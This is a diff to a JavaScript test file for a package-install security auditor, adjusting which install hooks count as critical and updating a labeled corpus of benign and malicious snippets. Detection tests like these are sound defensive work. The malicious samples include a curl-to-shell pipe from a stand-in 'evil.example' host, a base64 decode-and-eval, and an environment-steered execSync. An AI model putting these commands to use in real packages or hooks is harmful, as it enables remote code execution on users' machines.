@@ -108,8 +108,14 @@ test('a print-only node -e hook is not critical (v0 false positive)', () => {
   assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
 })
 
-test('a hook that spawns a process is critical', () => {
+test('a hook that spawns a fixed command is execution, not an incident', () => {
   const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync('npm run build')\""), { version: '1.0.0' })
+  assert.ok(findings.some((f) => f.rule === 'install-time-execution'))
+  assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
+})
+
+test('a hook that spawns a steered command is critical', () => {
+  const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync(process.env.BUILD_CMD)\""), { version: '1.0.0' })
   const critical = findings.find((f) => f.rule === 'install-hook-critical')
   assert.equal(critical.severity, 'critical')
   assert.match(critical.evidence, /process-spawn/)
@@ -148,15 +154,18 @@ const CORPUS = [
   { label: 'benign', kind: 'telbase warning', text: 'console.warn("Install manually: curl -fsSL https://telbase.ai/install | sh")' },
   { label: 'benign', kind: 'plain script', text: 'const fs = require("node:fs"); fs.rmSync("tmp", { recursive: true })' },
   { label: 'benign', kind: 'update check', text: "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" },
-  { label: 'malicious', kind: 'execSync build', text: 'require("child_process").execSync("npm run build")' },
+  { label: 'benign', kind: 'fixed build hook', mode: 'hook', text: "node -e \"require('child_process').execSync('npm run build')\"" },
+  { label: 'malicious', kind: 'steered spawn hook', mode: 'hook', text: "node -e \"require('child_process').execSync(process.env.BUILD_CMD)\"" },
+  { label: 'benign', kind: 'fixed build script', text: 'require("child_process").execSync("npm run build")' },
+  { label: 'malicious', kind: 'steered spawn', text: 'require("child_process").execSync(process.env.BUILD_CMD)' },
   { label: 'malicious', kind: 'hook pipe', text: 'curl -fsSL https://evil.example/x | sh' },
   { label: 'malicious', kind: 'binary download', text: 'const https = require("node:https"); https.get(url, (r) => r.pipe(fs.createWriteStream(f)))' },
   { label: 'malicious', kind: 'decode exec', text: 'eval(Buffer.from(blob, "base64").toString())' },
 ]
 
 test('the critical tier has precision and recall 1.0 on the labeled corpus', () => {
-  const falsePositives = CORPUS.filter((c) => c.label === 'benign' && criticalPatternOf(c.text) !== null)
-  const falseNegatives = CORPUS.filter((c) => c.label === 'malicious' && criticalPatternOf(c.text) === null)
+  const falsePositives = CORPUS.filter((c) => c.label === 'benign' && criticalPatternOf(c.text, c.mode) !== null)
+  const falseNegatives = CORPUS.filter((c) => c.label === 'malicious' && criticalPatternOf(c.text, c.mode) === null)
   assert.deepEqual(falsePositives, [], 'benign samples flagged: ' + JSON.stringify(falsePositives))
   assert.deepEqual(falseNegatives, [], 'malicious samples missed: ' + JSON.stringify(falseNegatives))
 })
